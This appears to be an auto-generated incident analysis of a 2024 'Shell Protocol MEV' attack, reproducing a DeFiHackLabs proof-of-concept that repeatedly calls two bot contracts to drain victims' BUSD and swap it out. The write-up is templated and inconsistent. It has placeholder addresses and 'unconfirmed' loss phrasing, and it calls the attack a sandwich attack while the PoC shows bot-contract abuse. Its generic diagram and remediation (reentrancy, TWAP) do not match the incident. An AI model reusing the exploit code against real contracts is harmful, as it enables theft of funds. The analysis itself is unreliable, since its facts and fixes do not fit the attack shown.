# Shell Protocol MEV — Analysis of Sandwich Attack on Shell Protocol by MEV Bot

| Item | Details |
|------|------|
| **Date** | 2024-01-25 |
| **Protocol** | Shell Protocol MEV |
| **Chain** | Ethereum |
| **Loss** | Unconfirmed |
| **Attacker** | [0xa898](https://etherscan.io/address/0xa898) |
| **Attack Tx** | [0x](https://etherscan.io/tx/0x) |
| **Vulnerable Contract** | [0x](https://etherscan.io/address/0x) |
| **Root Cause** | Sandwich attack on Shell Protocol transactions by MEV bot |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/Shell_MEV_0xa898_exp.sol) |

---
## 1. Vulnerability Overview

Shell Protocol MEV is a DeFi protocol operating on the Ethereum chain that was subjected to a **MEV / Sandwich Attack** on 2024-01-25.
The attacker exploited a sandwich attack on Shell Protocol transactions via an MEV bot, causing approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: MEV / Sandwich Attack
- **Impact**: Unconfirmed loss of protocol assets
- **Attack Vector**: Logic vulnerability

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Example of vulnerable implementation
// Issue: Sandwich attack on Shell Protocol transactions by MEV bot
// Attacker exploits this logic to gain illegitimate profit

// Shell Protocol MEV Sandwich Attack — Insufficient Slippage Protection
interface IPancakeRouter {
    // ❌ Vulnerable: Setting amountOutMin=0 or too low exposes to MEV bot sandwich attacks
    // Attacker front-runs with a large buy to raise price, victim's tx executes, attacker immediately sells
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// ✅ Correct implementation: Proper slippage protection + deadline setting
function safeSell(address tokenIn, address tokenOut, uint256 amountIn) external {
    // ✅ Calculate minimum output based on on-chain price (e.g., allow 1% slippage)
    uint256 expectedOut = getAmountOut(amountIn, tokenIn, tokenOut);
    uint256 minAmountOut = expectedOut * 99 / 100; // ✅ Maximum 1% slippage
    // ✅ Set deadline short relative to current block (prevents MEV delay)
    uint256 deadline = block.timestamp + 60; // ✅ Force execution within 60 seconds
    address[] memory path = new address[](2);
    path[0] = tokenIn;
    path[1] = tokenOut;
    IPancakeRouter(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amountIn, minAmountOut, path, msg.sender, deadline
    );
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Vulnerability Identified] ─────── Shell Protocol MEV Contract
  │
  ▼
[Malicious Transaction Sent] ─ Vulnerable Function Called
  │                              (Validation Bypassed)
  ▼
[Asset Drained] ──────────────── Profit Secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - Shell_MEV_0xa898_exp.sol
// Chain: Ethereum | Date: 2024-01-25

    function testExploit() public {
        BUSD.transfer(address(0x000000000000000000000000000000000000dEaD), BUSD.balanceOf(address(this)));
        emit log_named_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)));
        SHELL.approve(address(Router), type(uint256).max);
        while (BUSD.balanceOf(Victim1) > 10 * 1e18) {
            Robot1.call(
                abi.encodeWithSelector(
                    bytes4(0x5f90d725), Victim2, Victim1, address(this), BUSD.balanceOf(address(Victim1)), 100, 360
                )
            );
        }
        while (BUSD.balanceOf(Victim2) > 10 * 1e18) {
            Robot2.call(
                abi.encodeWithSelector(
                    bytes4(0x5f90d725), Victim2, Victim2, address(this), BUSD.balanceOf(address(Victim2)), 100, 360
                )
            );
        }

        TOKENTOBUSD();
        emit log_named_uint("Attacker BUSD balance before attack", BUSD.balanceOf(address(this)));
    }

    function TOKENTOBUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(SHELL);
        path[1] = address(BUSD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            SHELL.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    fallback() external payable {}
    receive() external payable {}
}

```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criteria | Details |
|-----------|------|
| **DASP Top 10** | Logic Vulnerability |
| **Attack Type** | Smart Contract Bug |
| **Vulnerability Category** | DeFi Attack |
| **Attack Complexity** | Medium |
| **Prerequisites** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause Vulnerable Functions**: Apply emergency pause to affected functions
2. **Assess Damage**: Identify the scale of lost assets and classify affected users
3. **Notify Stakeholders**: Immediately alert relevant DEXes, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: Validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: Update state
    balances[msg.sender] -= amount;
    // 3. Interactions: External calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 audit firms)
- Run a **bug bounty program**
- Establish a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **MEV / Sandwich attacks are preventable**: Proper validation and pattern application provides defense
2. **Consider economic incentives**: Design every function with attacker economic motivations in mind
3. **Audit priority**: Functions that directly handle assets are the highest-priority audit targets

### For Protocol Operators
1. **Real-time monitoring**: Build systems to immediately detect abnormally large transactions
2. **Incident response plan**: Maintain an actionable response manual ready for immediate execution upon attack
3. **Insurance**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-01-25** Shell Protocol MEV incident reconfirms the danger of **MEV / Sandwich Attack** exploits in the Ethereum ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was prepared for educational and security research purposes. Do not misuse.*
*PoC Source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/Shell_MEV_0xa898_exp.sol)*